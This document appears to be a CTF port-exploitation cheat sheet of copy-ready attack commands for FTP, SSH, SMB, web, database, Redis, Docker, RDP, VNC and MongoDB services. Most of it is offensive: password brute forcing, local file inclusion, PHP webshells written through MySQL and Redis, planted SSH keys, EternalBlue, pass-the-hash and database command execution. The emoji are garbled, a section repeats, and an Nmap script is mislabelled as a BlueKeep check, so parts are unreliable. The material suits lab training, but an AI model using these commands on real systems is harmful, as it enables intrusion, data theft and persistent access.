# üö© CTF Port Exploitation Cheat Sheet
> *Complete guide for attacking common services in CTF challenges*  
> ‚ö†Ô∏è **ONLY use on authorized CTF boxes or your own lab**


## üîç Initial Recon
```bash
# Quick scan
nmap -sV -sC -oN initial.txt $TARGET

# Full port scan
nmap -p- -T4 -oN allports.txt $TARGET

# UDP scan
nmap -sU --top-ports 20 -oN udp.txt $TARGET
```

---

## üìÅ Port 21 - FTP
**Service:** File Transfer Protocol  
**Common vulns:** Anonymous access, cleartext creds, directory traversal

### Enumeration
```bash
# Check anonymous access
ftp $TARGET
Username: anonymous
Password: anonymous

# Nmap script scan
nmap --script ftp-* -p 21 $TARGET
```

### Exploitation
```bash
# Download everything
wget -r ftp://anonymous:anonymous@$TARGET

# Upload reverse shell (if writable)
ftp> put shell.php
ftp> site chmod 777 shell.php

# Check for exploits
searchsploit vsftpd
searchsploit proftpd
```

### CTF Tips
- Look for: `user.txt`, `flag.txt`, `.ssh/id_rsa`, `backup.zip`
- Try default creds: `admin:admin`, `ftp:ftp`

---

## üîê Port 22 - SSH
**Service:** Secure Shell  
**Common vulns:** Weak passwords, leaked keys, outdated versions

### Enumeration
```bash
# Version detection
nc $TARGET 22

# User enumeration (if vulnerable)
python ssh_user_enum.py $TARGET root admin user
```

### Exploitation
```bash
# Brute force (last resort)
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://$TARGET
medusa -h $TARGET -u root -P passwords.txt -M ssh

# Use found private key
chmod 600 id_rsa
ssh -i id_rsa user@$TARGET

# If key has passphrase
ssh2john id_rsa > hash.txt
john --wordlist=rockyou.txt hash.txt
```

### CTF Tips
- Check HTTP/FTP for SSH keys first
- Username often in `/home/` directory names
- Try password = username

---

## üìû Port 23 - Telnet
**Service:** Unencrypted remote access  
**Common vulns:** Default credentials, no encryption

### Exploitation
```bash
telnet $TARGET
# Try: admin:admin, root:root, admin:password

# Brute force
hydra -l admin -P passwords.txt telnet://$TARGET
```

---

## üìß Port 25 - SMTP
**Service:** Simple Mail Transfer Protocol  
**Common vulns:** User enumeration, open relay

### Enumeration
```bash
# Manual enumeration
nc $TARGET 25
VRFY root
VRFY admin
EXPN users

# Automated
smtp-user-enum -M VRFY -U users.txt -t $TARGET
```

### Exploitation
```bash
# Send phishing email (social engineering CTF)
swaks --to admin@target.com --from test@test.com --server $TARGET
```

---

## üåê Port 53 - DNS
**Service:** Domain Name System  
**Common vulns:** Zone transfer, DNS cache poisoning

### Enumeration
```bash
# Zone transfer
dig axfr @$TARGET domain.local
dnsrecon -d domain.local -n $TARGET -t axfr

# Subdomain brute
gobuster dns -d domain.local -w subdomains.txt
```

---

## üì¶ Port 69 - TFTP
**Service:** Trivial File Transfer Protocol  
**Common vulns:** No authentication

### Exploitation
```bash
# Download files
tftp $TARGET
tftp> get passwd
tftp> get shadow

# Upload backdoor
tftp> put backdoor.php
```

---

## üåê Port 80/443 - HTTP/HTTPS
**Service:** Web Server  
**Common vulns:** SQLi, XSS, LFI/RFI, upload bypass

### Enumeration
```bash
# Directory brute force
gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak
ffuf -u http://$TARGET/FUZZ -w wordlist.txt

# Vulnerability scanning
nikto -h http://$TARGET
wpscan --url http://$TARGET --enumerate ap,u

# Check for common files
curl http://$TARGET/robots.txt
curl http://$TARGET/.git/config
curl http://$TARGET/.env
curl http://$TARGET/wp-config.php.bak
```

### Exploitation
```bash
# SQL Injection
sqlmap -u "http://$TARGET/login.php?id=1" --dump

# Local File Inclusion
curl http://$TARGET/index.php?page=../../../etc/passwd
curl http://$TARGET/index.php?page=php://filter/convert.base64-encode/resource=index.php

# File upload bypass
# Change extension: .php ‚Üí .phtml, .php3, .php5
# Add magic bytes: GIF89a<?php system($_GET['cmd']); ?>
# Double extension: shell.php.jpg

# Command injection
curl "http://$TARGET/ping.php?ip=127.0.0.1;id"
```

### CTF Tips
- View source for comments: `<!-- password: admin123 -->`
- Check cookies for base64 encoded data
- Look for `.git`, `.svn`, `.DS_Store` folders

---

## üìÆ Port 110/995 - POP3
**Service:** Post Office Protocol  
**Common vulns:** Cleartext auth (110), weak passwords

### Exploitation
```bash
# Manual connection
telnet $TARGET 110
USER admin
PASS password
LIST
RETR 1

# Brute force
hydra -l admin -P passwords.txt pop3://$TARGET
```

---

## üì¨ Port 143/993 - IMAP
**Service:** Internet Message Access Protocol  
**Common vulns:** Same as POP3

### Exploitation
```bash
nc $TARGET 143
A1 LOGIN admin password
A2 LIST "" "*"
A3 SELECT INBOX
A4 FETCH 1 BODY[]
```

---

## üîç Port 161/162 - SNMP
**Service:** Simple Network Management Protocol  
**Common vulns:** Default community strings

### Enumeration
```bash
# Brute community strings
onesixtyone -c community.txt $TARGET

# Walk the MIB tree
snmpwalk -c public -v1 $TARGET
snmp-check $TARGET

# Get specific info
snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.4.2.1.2  # Running processes
snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.6.13.1.3   # Open TCP ports
```

---

## üìÇ Port 139/445 - SMB/NetBIOS
**Service:** Server Message Block  
**Common vulns:** Null sessions, EternalBlue, weak shares

### Enumeration
```bash
# List shares
smbclient -L //$TARGET -N
smbmap -H $TARGET
enum4linux -a $TARGET

# Connect to share
smbclient //$TARGET/share -U ""
smbclient //$TARGET/C$ -U admin%password

# Mount share
mount -t cifs //$TARGET/share /mnt/smb
```

### Exploitation
```bash
# EternalBlue (MS17-010)
nmap --script smb-vuln-ms17-010 -p 445 $TARGET
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $TARGET; run"

# Pass the hash
pth-winexe -U administrator%aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 //$TARGET cmd
```

---

## üóÑÔ∏è Port 389/636 - LDAP
**Service:** Lightweight Directory Access Protocol  
**Common vulns:** Anonymous bind, information disclosure

### Enumeration
```bash
ldapsearch -x -h $TARGET -s base
ldapsearch -x -h $TARGET -b "dc=example,dc=com"
nmap -p 389 --script ldap-rootdse $TARGET
```

---

## üéÆ Port 1433 - MSSQL
**Service:** Microsoft SQL Server  
**Common vulns:** Weak sa password, xp_cmdshell

### Exploitation
```bash
# Login
sqsh -S $TARGET -U sa -P password

# Enable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE
EXEC xp_cmdshell 'whoami'

# Metasploit
msfconsole -q -x "use auxiliary/scanner/mssql/mssql_login; set RHOSTS $TARGET; run"
```

---

## üê¨ Port 3306 - MySQL
**Service:** MySQL Database  
**Common vulns:** Default creds, UDF exploitation

### Exploitation
```bash
# Connect
mysql -h $TARGET -u root -p
mysql -h $TARGET -u root -ppassword

# Brute force
hydra -l root -P passwords.txt mysql://$TARGET

# Read files
SELECT LOAD_FILE('/etc/passwd');

# Write shell
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

---

## üóÉÔ∏è Port 5432 - PostgreSQL
**Service:** PostgreSQL Database  
**Common vulns:** Default creds, command execution

### Exploitation
```bash
psql -h $TARGET -U postgres
# Password: postgres

# Command execution
CREATE TABLE cmd(cmd_output text);
COPY cmd FROM PROGRAM 'id';
SELECT * FROM cmd;
```

---

## üêí Port 6379 - Redis
**Service:** Redis key-value store  
**Common vulns:** No authentication, command execution

### Exploitation
```bash
redis-cli -h $TARGET

# Write SSH key
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
SET x "\n\nssh-rsa YOUR_PUBLIC_KEY\n\n"
SAVE

# Write webshell
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET x "<?php system($_GET['cmd']); ?>"
SAVE
```

---

## üîå Port 5900 - VNC
**Service:** Virtual Network Computing  
**Common vulns:** Weak/no authentication

### Exploitation
```bash
# Connect
vncviewer $TARGET:5900

# Brute force
hydra -P passwords.txt vnc://$TARGET

# Metasploit
msfconsole -q -x "use auxiliary/scanner/vnc/vnc_none_auth; set RHOSTS $TARGET; run"
```

---

## üê≥ Port 2375 - Docker
**Service:** Docker API  
**Common vulns:** Unauthenticated API

### Exploitation
```bash
# List containers
docker -H tcp://$TARGET:2375 ps

# Get shell
docker -H tcp://$TARGET:2375 exec -it container_id /bin/bash

# Create privileged container
docker -H tcp://$TARGET:2375 run -it -v /:/host --privileged ubuntu bash
```

---

```markdown
# üñ•Ô∏è Port 3389 - RDP (Remote Desktop Protocol)

**Common Vulnerabilities**: Weak passwords, exposed service to internet, known vulnerabilities like BlueKeep

## What to Check

- Check if the service is exposed without network-level authentication (NLA)
- Look for default or weak credentials
- Check for known vulnerabilities (e.g., CVE-2019-0708 BlueKeep)

## Enumeration

```bash
# Basic connection check
nc -nv $TARGET 3389

# Nmap scanning for vulnerabilities
nmap -p 3389 --script rdp-ntlm-info $TARGET
nmap -p 3389 --script rdp-enum-encryption $TARGET

# Check for BlueKeep vulnerability
nmap -p 3389 --script rdp-vuln-ms12-020 $TARGET
```

## Connection

```bash
# Using xfreerdp
xfreerdp /u:user /p:password /v:$TARGET

# Using rdesktop
rdesktop $TARGET -u username -p password

# With domain (if applicable)
xfreerdp /u:domain\\user /p:password /v:$TARGET

# Enable clipboard sharing and drive redirection
xfreerdp /u:user /p:password /v:$TARGET +clipboard /drive:share,/path/to/local/folder
```

## Cracking

```bash
# Hydra brute force
hydra -t 4 -V -f -l user -P rockyou.txt rdp://$TARGET

# With domain
hydra -t 4 -V -f -l user -P rockyou.txt rdp://$TARGET -s 3389 -m "domain:DOMAIN"

# Using ncrack
ncrack -vv --user user -P rockyou.txt rdp://$TARGET
```

## Exploitation

```bash
# If BlueKeep vulnerable (CVE-2019-0708)
# Use Metasploit module: exploit/windows/rdp/cve_2019_0708_bluekeep_rce

# Password spraying attack (try one password against multiple users)
hydra -L users.txt -p 'Password123' rdp://$TARGET
```

---

# üñ•Ô∏è Port 5900 - VNC (Virtual Network Computing)

**Common Vulnerabilities**: No authentication, weak passwords, unencrypted communication

## What to Check

- Check for unauthenticated access
- Look for weak or default passwords
- Check if the service is exposed to the internet

## Enumeration

```bash
# Basic version check
nc -nv $TARGET 5900

# Nmap scanning
nmap -p 5900 --script realvnc-auth-bypass,vnc-info,vnc-title $TARGET

# Check for authentication methods
nmap -p 5900 --script vnc-auth $TARGET
```

## Connection

```bash
# Basic connection (may prompt for password)
vncviewer $TARGET

# With password file
vncviewer -passwd passwordfile $TARGET

# Using tightvnc viewer
xtightvncviewer $TARGET

# Specify display number (if not default :0)
vncviewer $TARGET:1
```

## Cracking

```bash
# Hydra brute force
hydra -P rockyou.txt vnc://$TARGET

# Using medusa
medusa -h $TARGET -u root -P rockyou.txt -M vnc

# Specific port
hydra -P rockyou.txt vnc://$TARGET:5901
```

## Exploitation

```bash
# If no authentication required, simply connect
vncviewer $TARGET

# For RealVNC authentication bypass (if vulnerable)
# Use exploit: auxiliary/scanner/vnc/realvnc_authentication_bypass

# Screenshot capture without interaction
vncsnapshot $TARGET screenshot.jpg
```

---

# üñ•Ô∏è Port 27017 - MongoDB

**Common Vulnerabilities**: No authentication by default, exposed to internet, default configurations

## What to Check

- Check for unauthenticated access
- Look for databases containing sensitive information
- Check if the database is exposed to the internet

## Enumeration

```bash
# Basic connection test
nc -zv $TARGET 27017

# Nmap scanning
nmap -p 27017 --script mongodb-databases,mongodb-info $TARGET

# Check for authentication requirements
nmap -p 27017 --script mongodb-brute $TARGET
```

## Connection

```bash
# Try unauthenticated access
mongo --host $TARGET --port 27017

# If authentication is required
mongo --host $TARGET --port 27017 -u username -p password --authenticationDatabase admin

# Specify database
mongo --host $TARGET --port 27017 database_name
```

## Basic Commands

```javascript
// Once connected, try these commands:
show dbs                    // List all databases
use admin                   // Switch to admin database
show collections           // Show collections in current database
db.getCollectionNames()    // Get all collection names
db.users.find()            // Find all documents in users collection
db.admin.find()            // Check admin collection
```

## Exploitation

```bash
# Brute force credentials
hydra -l admin -P rockyou.txt mongodb://$TARGET

# Using nmap brute script
nmap -p 27017 --script mongodb-brute --script-args userdb=users.txt,passdb=rockyou.txt $TARGET

# Automated enumeration tool
mongoaudit --host $TARGET --port 27017
```

## Data Extraction

```javascript
// Dump all databases
show dbs
use sensitive_db
db.getCollectionNames().forEach(function(collection) {
    print("Collection: " + collection);
    db[collection].find().forEach(printjson);
});

// Look for flags or credentials
db.users.find({username: "admin"})
db.config.find({})
db.flag.find({})
```

## Security Issues

- **No authentication**: Many MongoDB instances have no authentication enabled
- **Exposed to internet**: Often found with default configuration exposing to 0.0.0.0
- **Default credentials**: admin:admin, root:root, etc.
- **Data encryption**: Often missing in default setups

## Protection Measures

- Enable authentication in mongod.conf
- Bind to localhost or specific IP only
- Use firewall rules to restrict access
- Enable SSL/TLS encryption
- Regularly update MongoDB to latest version
```

## üöÄ Quick Win Checklist
1. **Default credentials** - Try service:service, admin:admin
2. **Version exploits** - `searchsploit [service] [version]`
3. **Misconfigurations** - Anonymous access, null sessions
4. **Information leaks** - Comments, backups, .git folders
5. **Password reuse** - Creds from one service work on another
6. **Privilege escalation** - After initial access, check for SUID, sudo -l

---

## üìö Essential Tools
```bash
# Install all at once
apt install nmap gobuster nikto hydra sqlmap smbclient enum4linux metasploit-framework
```

---

## ‚ö° Pro Tips
- **Always check version numbers** ‚Üí searchsploit
- **Screenshot everything** for writeups
- **Keep notes** of what worked/failed
- **Try harder** but also try smarter
- **Read other writeups** after solving

---

> üéØ Remember: The flag is usually in `/home/user/user.txt` or `/root/root.txt`  
> Happy hacking! üö©
